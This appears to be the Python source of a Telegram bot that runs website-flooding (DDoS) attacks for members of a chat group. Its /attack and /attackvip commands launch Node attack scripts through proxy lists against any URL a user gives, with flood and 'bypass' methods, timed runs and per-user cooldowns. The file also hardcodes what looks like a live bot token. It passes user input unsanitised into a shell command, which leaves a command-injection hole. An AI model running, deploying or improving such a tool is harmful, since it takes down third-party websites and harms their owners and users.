import time
import threading
import subprocess
import random
import requests
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackContext
from urllib.parse import quote_plus
import datetime, json, os

# --- CONFIG ---
BOT_TOKEN = "7631197339:AAGwjDYsiZttkgmESFrZoO6FlHyaukJRPOE"
GROUP_ID = -1002535925512
ADMIN_FILE = "admins.json"
PROXY_FILE = "proxy.txt"
VIP_PROXY = "text.txt"
BLACKLIST = [
    "thcsnguyentrai.pgdductrong.edu.vn",
    "intenseapi.com",
    "edu.vn",
    "thisinh.thitotnghiepthpt.edu.vn",
    "gov.vn",
    "stats.firewall.mom",
    "www.nasa.gov",
    "neverlosevip.store",
    "youtube.com",
    "google.com",
    "facebook.com",
    "chinhphu.vn"
]

# --- ADMIN FILE LOADING ---
def load_admins():
    if not os.path.exists(ADMIN_FILE):
        return {"main_admin": 123456789, "sub_admins": []}
    with open(ADMIN_FILE, "r") as f:
        return json.load(f)

def save_admins(data):
    with open(ADMIN_FILE, "w") as f:
        json.dump(data, f, indent=4)

admin_data = load_admins()
ADMIN_MAIN_ID = admin_data["main_admin"]
ADMIN_IDS = [ADMIN_MAIN_ID] + admin_data["sub_admins"]

# --- CONFIG SETTINGS ---
MAX_USER_TIME = 60
DEFAULT_RATE = 20
DEFAULT_THREAD = 10
bot_status = True
user_last_attack_time = {}
attack_processes = []
start_time = time.time()

# --- UTILS ---
def is_sub_admin(user_id):
    return user_id in admin_data["sub_admins"]

def is_blacklisted(url):
    """
    Kiem tra xem URL co trong danh sach blacklist khong
    """
    return any(blacklist_url in url for blacklist_url in BLACKLIST)

# --- COMMANDS ---
async def start(update: Update, context: CallbackContext):
    status = "ON" if bot_status else "OFF"
    await update.message.reply_text(
        f"Bot đang: [{status}]\n"
        f"/attack <url> <time>\n"
        f"/attackvip <url> <time> <flood|bypass>\n"
        f"/proxy - Xem so luong proxy\n"
        f"/time - Xem uptime bot\n"
        f"/addadmin <id>, /deladmin <id> (admin chinh)\n"
        f"/listadmin - Xem danh sach admin"
    )

async def attack(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    now = time.time()

    if chat_id != GROUP_ID:
        await update.message.reply_text("Box chua đuoc duyet.")
        return
    if not bot_status:
        await update.message.reply_text("Bot đang tat.")
        return
    if user_id not in ADMIN_IDS and now - user_last_attack_time.get(user_id, 0) < MAX_USER_TIME:
        wait = int(MAX_USER_TIME - (now - user_last_attack_time[user_id]))
        await update.message.reply_text(f"Cho {wait} giay nua.")
        return

    try:
        url = context.args[0]
        duration = int(context.args[1])
        if user_id not in ADMIN_IDS and duration > MAX_USER_TIME:
            await update.message.reply_text(f"Toi đa {MAX_USER_TIME} giay.")
            return

        if is_blacklisted(url):
            await update.message.reply_text("URL nay bi cam trong blacklist.")
            return

        command = f"node bypass.js {url} {duration} {DEFAULT_RATE} {DEFAULT_THREAD} {PROXY_FILE}"
        proc = subprocess.Popen(command, shell=True)
        attack_processes.append(proc)
        user_last_attack_time[user_id] = now

        time_str = time.strftime("%H:%M:%S %d/%m/%Y", time.localtime(now))
        json_text = f"""{{
  "Status": "✨🗿🚦 Attack Started 🛸🚥✨",
  "Caller": "@{update.effective_user.username or user_id}",
  "PID": {int(now)},
  "Website": "{url}",
  "Time": "{duration} Giay",
  "MaxTime": {MAX_USER_TIME},
  "Method": "flood",
  "StartTime": "{time_str}"
}}"""

        check_url = f"https://check-host.net/check-http?host={quote_plus(url)}"
        keyboard = [[InlineKeyboardButton("Kiem Tra Website", url=check_url)]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await context.bot.send_message(chat_id=chat_id, text=json_text, reply_markup=reply_markup)

        threading.Timer(duration, lambda: context.bot.send_message(chat_id=chat_id, text="✅ Đa hoan tat attack!")).start()

    except:
        await update.message.reply_text("Sai cu phap: /attack <url> <time>")

async def attackvip(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("Chi admin đuoc dung.")
        return
    try:
        url = context.args[0]
        duration = int(context.args[1])
        method = context.args[2].lower()
        if method not in ["flood", "bypass"]:
            await update.message.reply_text("Phuong thuc phai la 'flood' hoac 'bypass'.")
            return

        command = f"node zentra.js {url} {duration} 20 15 {VIP_PROXY} {method}"
        proc = subprocess.Popen(command, shell=True)
        attack_processes.append(proc)
        user_last_attack_time[user_id] = time.time()

        time_str = time.strftime("%H:%M:%S %d/%m/%Y", time.localtime())
        json_text = f"""{{
  "Status": "✨ VIP Attack Started ✨",
  "Caller": "@{update.effective_user.username or user_id}",
  "PID": {int(time.time())},
  "URL": "{url}",
  "Time": "{duration} Giay",
  "Rate": "20",
  "Thread": "15",
  "Proxy": "{VIP_PROXY}",
  "Method": "{method}",
  "StartTime": "{time_str}"
}}"""

        check_url = f"https://check-host.net/check-http?host={quote_plus(url)}"
        keyboard = [[InlineKeyboardButton("Kiem Tra Website", url=check_url)]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await context.bot.send_message(chat_id=update.effective_chat.id, text=json_text, reply_markup=reply_markup)

        threading.Timer(duration, lambda: context.bot.send_message(chat_id=update.effective_chat.id, text="✅ VIP attack hoan tat!")).start()

    except:
        await update.message.reply_text("Sai cu phap: /attackvip <url> <time> <flood|bypass>")

async def proxy(update: Update, context: CallbackContext):
    try:
        with open("text.txt", "r") as f:
            lines = [line.strip() for line in f]
        await context.bot.send_message(update.effective_chat.id, f"So luong proxy: {len(lines)}")
        await context.bot.send_document(update.effective_chat.id, open("text.txt", "rb"))
    except FileNotFoundError:
        await update.message.reply_text("Khong tim thay file proxy.")

async def show_uptime(update: Update, context: CallbackContext):
    uptime = int(time.time() - start_time)
    h = uptime // 3600
    m = (uptime % 3600) // 60
    s = uptime % 60
    await update.message.reply_text(f"Bot đa hoat đong: {h} gio, {m} phut, {s} giay")

async def add_admin(update: Update, context: CallbackContext):
    if update.effective_user.id != ADMIN_MAIN_ID:
        await update.message.reply_text("Chi admin chinh đuoc them.")
        return
    try:
        new_id = int(context.args[0])
        if new_id in ADMIN_IDS:
            await update.message.reply_text("ID nay đa la admin.")
        else:
            admin_data["sub_admins"].append(new_id)
            save_admins(admin_data)
            ADMIN_IDS.append(new_id)
            await update.message.reply_text(f"Đa them admin phu: {new_id}")
    except:
        await update.message.reply_text("Sai cu phap: /addadmin <id>")

async def del_admin(update: Update, context: CallbackContext):
    if update.effective_user.id != ADMIN_MAIN_ID:
        await update.message.reply_text("Chi admin chinh đuoc xoa.")
        return
    try:
        rem_id = int(context.args[0])
        if rem_id not in admin_data["sub_admins"]:
            await update.message.reply_text("ID khong ton tai trong admin phu.")
        else:
            admin_data["sub_admins"].remove(rem_id)
            save_admins(admin_data)
            ADMIN_IDS.remove(rem_id)
            await update.message.reply_text(f"Đa xoa admin phu: {rem_id}")
    except:
        await update.message.reply_text("Sai cu phap: /deladmin <id>")

async def list_admin(update: Update, context: CallbackContext):
    if update.effective_user.id not in ADMIN_IDS:
        return
    msg = f"ADMIN CHINH: {ADMIN_MAIN_ID}\nSUB ADMIN: {', '.join(map(str, admin_data['sub_admins']))}"
    await update.message.reply_text(msg)

# --- MAIN ---
def main():
    application = Application.builder().token(BOT_TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("attackvip", attackvip))
    application.add_handler(CommandHandler("proxy", proxy))
    application.add_handler(CommandHandler("time", show_uptime))
    application.add_handler(CommandHandler("addadmin", add_admin))
    application.add_handler(CommandHandler("deladmin", del_admin))
    application.add_handler(CommandHandler("listadmin", list_admin))

    application.run_polling()

if __name__ == '__main__':
    main()
